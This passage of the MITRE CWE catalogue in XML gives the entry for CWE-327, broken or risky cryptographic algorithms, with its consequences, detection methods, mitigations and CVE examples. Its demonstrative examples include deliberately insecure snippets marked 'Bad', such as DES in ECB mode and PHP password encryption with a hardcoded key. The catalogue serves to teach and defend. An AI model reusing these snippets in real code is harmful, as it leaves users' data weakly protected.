					<Modification_Comment>updated Maintenance_Notes, Potential_Mitigations, Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2021-10-28</Modification_Date>
					<Modification_Comment>updated Relationships</Modification_Comment>
				</Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Description, Relationships</Modification_Comment>
				</Modification>
            <Previous_Entry_Name Date="2009-07-27">Weak Encryption</Previous_Entry_Name>
         </Content_History>
      </Weakness>
      <Weakness ID="327" Name="Use of a Broken or Risky Cryptographic Algorithm" Abstraction="Class" Structure="Simple" Status="Draft">
         <Description>The product uses a broken or risky cryptographic algorithm or protocol.</Description>
         <Extended_Description>
	   <xhtml:p>Cryptographic algorithms are the methods by which data is scrambled to prevent observation or influence by unauthorized actors. Insecure cryptography can be exploited to expose sensitive information, modify data in unexpected ways, spoof identities of other users or devices, or other impacts.</xhtml:p>
           <xhtml:p>It is very difficult to produce a secure algorithm, and even high-profile algorithms by accomplished cryptographic experts have been broken. Well-known techniques exist to break or weaken various kinds of cryptography. Accordingly, there are a small number of well-understood and heavily studied algorithms that should be used by most products. Using a non-standard or known-insecure algorithm is dangerous because a determined adversary may be able to break the algorithm and compromise whatever data has been protected.</xhtml:p>
           <xhtml:p>Since the state of cryptography advances so rapidly, it is common for an algorithm to be considered "unsafe" even if it was once thought to be strong. This can happen when new attacks are discovered, or if computing power increases so much that the cryptographic algorithm no longer provides the amount of protection that was originally thought.</xhtml:p>
	   <xhtml:p>For a number of reasons, this weakness is even more challenging to manage with hardware deployment of cryptographic algorithms as opposed to software implementation. First, if a flaw is discovered with hardware-implemented cryptography, the flaw cannot be fixed in most cases without a recall of the product, because hardware is not easily replaceable like software. Second, because the hardware product is expected to work for years, the adversary's computing power will only increase over time.</xhtml:p>
	 </Extended_Description>
         <Related_Weaknesses>
            <Related_Weakness Nature="ChildOf" CWE_ID="693" View_ID="1000" Ordinal="Primary"/>
            <Related_Weakness Nature="PeerOf" CWE_ID="311" View_ID="1000"/>
         </Related_Weaknesses>
         <Applicable_Platforms>
           <Language Class="Not Language-Specific" Prevalence="Undetermined"/>
	   <Language Name="Verilog" Prevalence="Undetermined"/>
           <Language Name="VHDL" Prevalence="Undetermined"/>
           <Technology Class="Not Technology-Specific" Prevalence="Undetermined"/>
	   <Technology Class="ICS/OT" Prevalence="Undetermined"/>
         </Applicable_Platforms>
         <Modes_Of_Introduction>
            <Introduction>
               <Phase>Architecture and Design</Phase>
               <Note>COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic.</Note>
            </Introduction>
            <Introduction>
               <Phase>Implementation</Phase>
               <Note>With hardware, the Architecture or Design Phase might start with compliant cryptography, but it is replaced with a non-compliant crypto during the later Implementation phase due to implementation constraints (e.g., not enough entropy to make it function properly, or not enough silicon real estate available to implement). Or, in rare cases (especially for long projects that span over years), the Architecture specifications might start with cryptography that was originally compliant at the time the Architectural specs were written, but over the time it became non-compliant due to progress made in attacking the crypto.</Note>
            </Introduction>
         </Modes_Of_Introduction>
         <Likelihood_Of_Exploit>High</Likelihood_Of_Exploit>
         <Common_Consequences>
            <Consequence>
               <Scope>Confidentiality</Scope>
               <Impact>Read Application Data</Impact>
               <Note>The confidentiality of sensitive data may be compromised by the use of a broken or risky cryptographic algorithm.</Note>
            </Consequence>
            <Consequence>
               <Scope>Integrity</Scope>
               <Impact>Modify Application Data</Impact>
               <Note>The integrity of sensitive data may be compromised by the use of a broken or risky cryptographic algorithm.</Note>
            </Consequence>
            <Consequence>
               <Scope>Accountability</Scope>
               <Scope>Non-Repudiation</Scope>
               <Impact>Hide Activities</Impact>
               <Note>If the cryptographic algorithm is used to ensure the identity of the source of the data (such as digital signatures), then a broken algorithm will compromise this scheme and the source of the data cannot be proven.</Note>
            </Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method>
               <Method>Automated Analysis</Method>
               <Description>Automated methods may be useful for recognizing commonly-used libraries or features that have become obsolete.</Description>
               <Effectiveness>Moderate</Effectiveness>
               <Effectiveness_Notes>False negatives may occur if the tool is not aware of the cryptographic libraries in use, or if custom cryptography is being used.</Effectiveness_Notes>
            </Detection_Method>
            <Detection_Method Detection_Method_ID="DM-7">
               <Method>Manual Analysis</Method>
               <Description>This weakness can be detected using tools and techniques that require manual (human) analysis, such as penetration testing, threat modeling, and interactive tools that allow the tester to record and modify an active session.</Description>
               <Effectiveness_Notes>These may be more effective than strictly automated techniques. This is especially the case with weaknesses that are related to design and business rules.</Effectiveness_Notes>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis - Binary or Bytecode</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Bytecode Weakness Analysis - including disassembler + source code weakness analysis</xhtml:li>
                           <xhtml:li>Binary Weakness Analysis - including disassembler + source code weakness analysis</xhtml:li>
                           <xhtml:li>Binary / Bytecode simple extractor - strings, ELF readers, etc.</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Binary or Bytecode</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Binary / Bytecode disassembler - then use manual analysis for vulnerabilities &amp; anomalies</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Dynamic Analysis with Automated Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Web Application Scanner</xhtml:li>
                           <xhtml:li>Web Services Scanner</xhtml:li>
                           <xhtml:li>Database Scanners</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Dynamic Analysis with Manual Results Interpretation</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Man-in-the-middle attack tool</xhtml:li>
                        </xhtml:ul>
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Framework-based Fuzzer</xhtml:li>
                           <xhtml:li>Automated Monitored Execution</xhtml:li>
                           <xhtml:li>Monitored Virtual Environment - run potentially malicious code in sandbox / wrapper / virtual machine, see if it does anything suspicious</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Manual Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Manual Source Code Review (not inspections)</xhtml:li>
                        </xhtml:ul>
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Focused Manual Spotcheck - Focused manual analysis of source</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis - Source Code</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Source code Weakness Analyzer</xhtml:li>
                           <xhtml:li>Context-configured Source Code Weakness Analyzer</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Automated Static Analysis</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Configuration Checker</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>SOAR Partial</Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method>Architecture or Design Review</Method>
               <Description>
                  <xhtml:p>According to SOAR, the following detection techniques may be useful:</xhtml:p>
                  <xhtml:div style="margin-left:1em;">
                     <xhtml:div>Highly cost effective:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Formal Methods / Correct-By-Construction</xhtml:li>
                        </xhtml:ul>
                     <xhtml:div>Cost effective for partial coverage:</xhtml:div>
                        <xhtml:ul>
                           <xhtml:li>Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)</xhtml:li>
                        </xhtml:ul>
                  </xhtml:div>
               </Description>
               <Effectiveness>High</Effectiveness>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation Mitigation_ID="MIT-24">
               <Phase>Architecture and Design</Phase>
               <Strategy>Libraries or Frameworks</Strategy>
               <Description>
                  <xhtml:p>When there is a need to store or transmit sensitive data, use strong, up-to-date cryptographic algorithms to encrypt that data. Select a well-vetted algorithm that is currently considered to be strong by experts in the field, and use well-tested implementations. As with all cryptographic mechanisms, the source code should be available for analysis.</xhtml:p>
                  <xhtml:p>For example, US government systems require FIPS 140-2 certification [REF-1192].</xhtml:p>
                  <xhtml:p>Do not develop custom or private cryptographic algorithms. They will likely be exposed to attacks that are well-understood by cryptographers. Reverse engineering techniques are mature. If the algorithm can be compromised if attackers find out how it works, then it is especially weak.</xhtml:p>
                  <xhtml:p>Periodically ensure that the cryptography has not become obsolete. Some older algorithms, once thought to require a billion years of computing time, can now be broken in days or hours. This includes MD4, MD5, SHA1, DES, and other algorithms that were once regarded as strong. [REF-267]</xhtml:p>
               </Description>
            </Mitigation>
        <Mitigation Mitigation_ID="MIT-52">
          <Phase>Architecture and Design</Phase>
          <Description>Ensure that the design allows one cryptographic algorithm to be replaced with another in the next generation or version. Where possible, use wrappers to make the interfaces uniform. This will make it easier to upgrade to stronger algorithms. With hardware, design the product at the Intellectual Property (IP) level so that one cryptographic algorithm can be replaced with another in the next generation of the hardware product.</Description>
	  <Effectiveness>Defense in Depth</Effectiveness>
        </Mitigation>
            <Mitigation>
               <Phase>Architecture and Design</Phase>
               <Description>Carefully manage and protect cryptographic keys (see CWE-320). If the keys can be guessed or stolen, then the strength of the cryptography itself is irrelevant.</Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-4">
               <Phase>Architecture and Design</Phase>
               <Strategy>Libraries or Frameworks</Strategy>
               <Description>
                  <xhtml:p>Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.</xhtml:p>
                  <xhtml:p>Industry-standard implementations will save development time and may be more likely to avoid errors that can occur during implementation of cryptographic algorithms. Consider the ESAPI Encryption feature.</xhtml:p>
               </Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-25">
               <Phase>Implementation</Phase>
               <Phase>Architecture and Design</Phase>
               <Description>When using industry-approved techniques, use them correctly. Don't cut corners by skipping resource-intensive steps (CWE-325). These steps are often essential for preventing common attacks.</Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>These code examples use the Data Encryption Standard (DES).</Intro_Text>
               <Example_Code Nature="Bad" Language="C">
                  <xhtml:div>EVP_des_ecb();</xhtml:div>
               </Example_Code>
               <Example_Code Nature="Bad" Language="Java">
                  <xhtml:div>Cipher des=Cipher.getInstance("DES...");<xhtml:br/>des.initEncrypt(key2);</xhtml:div>
               </Example_Code>
               <Example_Code Nature="Bad" Language="PHP">
                  <xhtml:div>function encryptPassword($password){<xhtml:div style="margin-left:1em;">$iv_size = mcrypt_get_iv_size(MCRYPT_DES, MCRYPT_MODE_ECB);<xhtml:br/>$iv = mcrypt_create_iv($iv_size, MCRYPT_RAND);<xhtml:br/>$key = "This is a password encryption key";<xhtml:br/>$encryptedPassword = mcrypt_encrypt(MCRYPT_DES, $key, $password, MCRYPT_MODE_ECB, $iv);<xhtml:br/>return $encryptedPassword;</xhtml:div>}</xhtml:div>
               </Example_Code>
               <Body_Text>Once considered a strong algorithm, DES now regarded as insufficient for many applications. It has been replaced by Advanced Encryption Standard (AES).</Body_Text>
            </Demonstrative_Example>
	    <Demonstrative_Example>
	      <Intro_Text>Suppose a chip manufacturer decides to implement a hashing scheme for verifying integrity property of certain bitstream, and it chooses to implement a SHA1 hardware accelerator for to implement the scheme.</Intro_Text>
	      <Example_Code Nature="Bad" Language="Other">
		<xhtml:div>The manufacturer chooses a SHA1 hardware accelerator for to implement the scheme because it already has a working SHA1 Intellectual Property (IP) that the manufacturer had created and used earlier, so this reuse of IP saves design cost.</xhtml:div>
	      </Example_Code>
	      <Body_Text>However, SHA1 was theoretically broken in 2005 and practically broken in 2017 at a cost of $110K. This means an attacker with access to cloud-rented computing power will now be able to provide a malicious bitstream with the same hash value, thereby defeating the purpose for which the hash was used.</Body_Text>
	      <Body_Text>This issue could have been avoided with better design.</Body_Text>
	      <Example_Code Nature="Good" Language="Other">
		<xhtml:div>The manufacturer could have chosen a cryptographic solution that is recommended by the wide security community (including standard-setting bodies like NIST) and is not expected to be broken (or even better, weakened) within the reasonable life expectancy of the hardware product. In this case, the architects could have used SHA-2 or SHA-3, even if it meant that such choice would cost extra.</xhtml:div>
	      </Example_Code>
	    </Demonstrative_Example>
            <Demonstrative_Example Demonstrative_Example_ID="DX-153">
	            <Intro_Text>In 2022, the OT:ICEFALL study examined products by 10 different Operational Technology (OT) vendors. The researchers reported 56 vulnerabilities and said that the products were "insecure by design" [REF-1283]. If exploited, these vulnerabilities often allowed adversaries to change how the products operated, ranging from denial of service to changing the code that the products executed. Since these products were often used in industries such as power, electrical, water, and others, there could even be safety implications.</Intro_Text>
	            <Body_Text>Multiple OT products used weak cryptography.</Body_Text>
	         </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Reference>CVE-2022-30273</Reference>
               <Description>SCADA-based protocol supports a legacy encryption mode that uses Tiny Encryption Algorithm (TEA) in ECB mode, which leaks patterns in messages and cannot protect integrity</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-30273</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2022-30320</Reference>
               <Description>Programmable Logic Controller (PLC) uses a protocol with a cryptographically insecure hashing algorithm for passwords.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2022-30320</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-3775</Reference>
               <Description>Product uses "ROT-25" to obfuscate the password in the registry.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-3775</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-4150</Reference>
               <Description>product only uses "XOR" to obfuscate sensitive data</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2007-4150</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-5460</Reference>
               <Description>product only uses "XOR" and a fixed key to obfuscate sensitive data</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2007-5460</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-4860</Reference>
               <Description>Product substitutes characters with other characters in a fixed way, and also leaves certain input characters unchanged.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-4860</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2002-2058</Reference>
               <Description>Attackers can infer private IP addresses by dividing each octet by the MD5 hash of '20'.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2002-2058</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2008-3188</Reference>
               <Description>Product uses DES when MD5 has been specified in the configuration, resulting in weaker-than-expected password hashes.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2008-3188</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2005-2946</Reference>
               <Description>Default configuration of product uses MD5 instead of stronger algorithms that are available, simplifying forgery of certificates.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2005-2946</Link>
            </Observed_Example>
            <Observed_Example>
               <Reference>CVE-2007-6013</Reference>
               <Description>Product uses the hash of a hash for authentication, allowing attackers to gain privileges if they can obtain the original hash.</Description>
               <Link>https://www.cve.org/CVERecord?id=CVE-2007-6013</Link>
            </Observed_Example>
         </Observed_Examples>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Taxonomy_Name="CLASP">
               <Entry_Name>Using a broken or risky cryptographic algorithm</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OWASP Top Ten 2004">
               <Entry_ID>A8</Entry_ID>
               <Entry_Name>Insecure Storage</Entry_Name>
               <Mapping_Fit>CWE More Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="CERT C Secure Coding">
               <Entry_ID>MSC30-C</Entry_ID>
               <Entry_Name>Do not use the rand() function for generating pseudorandom numbers</Entry_Name>
               <Mapping_Fit>CWE More Abstract</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="CERT C Secure Coding">
               <Entry_ID>MSC32-C</Entry_ID>
               <Entry_Name>Properly seed pseudorandom number generators</Entry_Name>
               <Mapping_Fit>CWE More Abstract</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="The CERT Oracle Secure Coding Standard for Java (2011)">
               <Entry_ID>MSC02-J</Entry_ID>
               <Entry_Name>Generate strong random numbers</Entry_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Taxonomy_Name="OMG ASCSM">
                <Entry_ID>ASCSM-CWE-327</Entry_ID>
            </Taxonomy_Mapping>
			<Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
			  <Entry_ID>Part 3-3</Entry_ID>
              <Entry_Name>Req SR 4.3</Entry_Name>
			</Taxonomy_Mapping>
			<Taxonomy_Mapping Taxonomy_Name="ISA/IEC 62443">
			  <Entry_ID>Part 4-2</Entry_ID>
              <Entry_Name>Req CR 4.3</Entry_Name>
			</Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_ID="20"/>
            <Related_Attack_Pattern CAPEC_ID="459"/>
            <Related_Attack_Pattern CAPEC_ID="473"/>
            <Related_Attack_Pattern CAPEC_ID="475"/>
            <Related_Attack_Pattern CAPEC_ID="608"/>
            <Related_Attack_Pattern CAPEC_ID="614"/>
            <Related_Attack_Pattern CAPEC_ID="97"/>
         </Related_Attack_Patterns>
         <References>
            <Reference External_Reference_ID="REF-280"/>
            <Reference External_Reference_ID="REF-281"/>
            <Reference External_Reference_ID="REF-282"/>
            <Reference External_Reference_ID="REF-267"/>
            <Reference External_Reference_ID="REF-284"/>
            <Reference External_Reference_ID="REF-7" Section="Chapter 8, &#34;Cryptographic Foibles&#34; Page 259"/>
            <Reference External_Reference_ID="REF-44" Section="&#34;Sin 21: Using the Wrong Cryptography.&#34; Page 315"/>
            <Reference External_Reference_ID="REF-287"/>
            <Reference External_Reference_ID="REF-62" Section="Chapter 2, &#34;Insufficient or Obsolete Encryption&#34;, Page 44"/>
            <Reference External_Reference_ID="REF-962" Section="ASCSM-CWE-327"/>
            <Reference External_Reference_ID="REF-18"/>
            <Reference External_Reference_ID="REF-1192"/>
            <Reference External_Reference_ID="REF-1283"/>
         </References>
         <Notes>
           <Note Type="Maintenance">Since CWE 4.4, various cryptography-related entries, including CWE-327 and CWE-1240, have been slated for extensive research, analysis, and community consultation to define consistent terminology, improve relationships, and reduce overlap or duplication. As of CWE 4.6, this work is still ongoing.</Note>
	       <Note Type="Maintenance">The Taxonomy_Mappings to ISA/IEC 62443 were added in CWE 4.10, but they are still under review and might change in future CWE versions. These draft mappings were performed by members of the "Mapping CWE to 62443" subgroup of the CWE-CAPEC ICS/OT Special Interest Group (SIG), and their work is incomplete as of CWE 4.10. The mappings are included to facilitate discussion and review by the broader ICS/OT community, and they are likely to change in future CWE versions.</Note>
         </Notes>
         <Content_History>
            <Submission>
               <Submission_Name>CLASP</Submission_Name>
               <Submission_Date>2006-07-19</Submission_Date>
            </Submission>
            <Modification>
               <Modification_Organization>Veracode</Modification_Organization>
               <Modification_Date>2008-08-15</Modification_Date>
               <Modification_Comment>Suggested OWASP Top Ten 2004 mapping</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Background_Details, Common_Consequences, Description, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-01-12</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Description, Observed_Examples, Potential_Mitigations, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-03-10</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-07-27</Modification_Date>
               <Modification_Comment>updated Maintenance_Notes, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-10-29</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2009-12-28</Modification_Date>
               <Modification_Comment>updated References</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Detection_Factors, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-04-05</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Potential_Mitigations, Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Detection_Factors, Potential_Mitigations, References, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2010-09-27</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Description</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-06-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2011-09-13</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated References, Related_Attack_Patterns, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2013-02-21</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-02-18</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-06-23</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Detection_Factors, Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-01-19</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2017-11-08</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Likelihood_of_Exploit, Modes_of_Introduction, References, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification>
               <Modification_Name>CWE Content Team</Modification_Name>
               <Modification_Organization>MITRE</Modification_Organization>
               <Modification_Date>2018-03-27</Modification_Date>
               <Modification_Comment>updated References, Relationships</Modification_Comment>
            </Modification>
	    <Modification>
	      <Modification_Name>CWE Content Team</Modification_Name>
	      <Modification_Organization>MITRE</Modification_Organization>
	      <Modification_Date>2019-01-03</Modification_Date>
	      <Modification_Comment>updated References, Relationships, Taxonomy_Mappings</Modification_Comment>
	    </Modification>
	    <Modification>
	      <Modification_Name>CWE Content Team</Modification_Name>
	      <Modification_Organization>MITRE</Modification_Organization>
	      <Modification_Date>2019-06-20</Modification_Date>
	      <Modification_Comment>updated Related_Attack_Patterns, Relationships, Type</Modification_Comment>
	    </Modification>
	    <Modification>
	      <Modification_Name>CWE Content Team</Modification_Name>
	      <Modification_Organization>MITRE</Modification_Organization>
	      <Modification_Date>2020-02-24</Modification_Date>
	      <Modification_Comment>updated Applicable_Platforms, Detection_Factors, Maintenance_Notes, Relationships</Modification_Comment>
	    </Modification>
	    <Modification>
	      <Modification_Name>CWE Content Team</Modification_Name>
	      <Modification_Organization>MITRE</Modification_Organization>
	      <Modification_Date>2021-03-15</Modification_Date>
	      <Modification_Comment>updated References</Modification_Comment>
	    </Modification>
	    <Modification>
	      <Modification_Name>CWE Content Team</Modification_Name>
	      <Modification_Organization>MITRE</Modification_Organization>
	      <Modification_Date>2021-10-28</Modification_Date>
	      <Modification_Comment>updated Maintenance_Notes, Potential_Mitigations, Relationships</Modification_Comment>
	    </Modification>
	    <Modification>
	      <Modification_Name>CWE Content Team</Modification_Name>
	      <Modification_Organization>MITRE</Modification_Organization>
	      <Modification_Date>2022-04-28</Modification_Date>
	      <Modification_Comment>updated Relationships</Modification_Comment>
	    </Modification>
	    <Modification>
	      <Modification_Name>CWE Content Team</Modification_Name>
	      <Modification_Organization>MITRE</Modification_Organization>
	      <Modification_Date>2022-10-13</Modification_Date>
	      <Modification_Comment>updated Demonstrative_Examples, Observed_Examples, References</Modification_Comment>
	    </Modification>
				<Modification>
					<Modification_Name>CWE Content Team</Modification_Name>
					<Modification_Organization>MITRE</Modification_Organization>
					<Modification_Date>2023-01-31</Modification_Date>
					<Modification_Comment>updated Applicable_Platforms, Background_Details, Demonstrative_Examples, Description, Maintenance_Notes, Modes_of_Introduction, Observed_Examples, Potential_Mitigations, References, Taxonomy_Mappings, Time_of_Introduction</Modification_Comment>
				</Modification>
	    <Contribution Type="Content">
	      <Contribution_Name>Parbati K. Manna</Contribution_Name>
	      <Contribution_Organization>Intel Corporation</Contribution_Organization>
	      <Contribution_Date>2019-12-10</Contribution_Date>
